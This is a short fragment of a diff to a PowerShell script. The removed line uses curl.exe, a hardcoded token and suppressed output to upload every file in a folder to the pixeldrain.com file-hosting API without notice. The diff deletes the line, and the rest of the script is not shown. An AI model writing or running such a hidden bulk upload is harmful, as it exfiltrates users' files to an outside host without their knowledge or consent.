@@ -16,7 +16,7 @@ if (Test-Path $FolderPath) {
         Get-ChildItem -Path $FolderPath -File | ForEach-Object {
             $File = $_.FullName
             if (Test-Path $File) {
-                curl.exe -T "$($File.FullName)" -u ":310c295d-cdfb-449a-98dd-121ef3b1ab3e" https://pixeldrain.com/api/file/ > $null 2>&1
+             
             }
         }
     } -ArgumentList $FolderPath
